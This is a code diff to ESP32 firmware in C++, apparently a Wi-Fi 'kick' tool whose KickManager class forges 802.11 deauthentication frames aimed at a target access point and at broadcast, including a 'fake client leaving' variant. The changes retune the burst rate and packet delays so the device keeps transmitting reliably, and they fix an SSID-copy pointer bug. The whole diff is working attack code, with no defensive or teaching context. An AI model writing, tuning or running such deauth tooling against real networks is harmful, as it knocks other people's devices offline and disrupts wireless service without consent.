@@ -9,8 +9,10 @@
 #include <string.h>
 
 static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-#define DEAUTH_BURST_PER_SEC 20
-#define DEAUTH_INTERVAL_MS (1000 / DEAUTH_BURST_PER_SEC)
+/* Space out 80211_tx calls to avoid ESP32 stopping (doc: wait for send
+ * completion). */
+#define DEAUTH_INTERVAL_MS 150 /* one burst per 150 ms */
+#define DEAUTH_DELAY_BETWEEN_PACKETS_MS 50
 
 KickManager::KickManager()
     : targetSet_(false), targetIsOwnAP_(false), attacking_(false),
@@ -36,13 +38,12 @@ void KickManager::setTargetFromScan(int scanIndex) {
   if (!bssid)
     return;
   memcpy(targetBSSID_, bssid, 6);
-  // Optimized: use c_str() instead of String
-  const char *ssid = WiFi.SSID(scanIndex).c_str();
-  if (ssid) {
-    size_t len = strlen(ssid);
+  String ssidStr = WiFi.SSID(scanIndex);
+  if (ssidStr.length() > 0) {
+    size_t len = ssidStr.length();
     if (len >= KICK_TARGET_SSID_LEN)
       len = KICK_TARGET_SSID_LEN - 1;
-    strncpy(targetSSID_, ssid, len);
+    strncpy(targetSSID_, ssidStr.c_str(), len);
     targetSSID_[len] = '\0';
   } else {
     targetSSID_[0] = '\0';
@@ -103,9 +104,10 @@ void KickManager::sendDeauthBurst() {
   if (e == ESP_OK) {
     packetCount_++;
   } else if (e != ESP_ERR_WIFI_NOT_INIT) {
-    // Логируем ошибки кроме "WiFi not initialized" (это нормально при старте)
     Serial.printf("[KICK] Deauth send error: %d\n", e);
   }
+
+  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
 
   // Second variant: DA=AP, SA=broadcast (fake client leaving)
   deauthBuf_[4] = targetBSSID_[0];
@@ -131,9 +133,7 @@ void KickManager::tick() {
   if (now - lastBurstMs_ < (unsigned long)DEAUTH_INTERVAL_MS)
     return;
   lastBurstMs_ = now;
-  for (int i = 0; i < 3; i++) {
-    sendDeauthBurst();
-  }
+  sendDeauthBurst();
 }
 
 void KickManager::getTargetSSID(char *out, size_t maxLen) const {
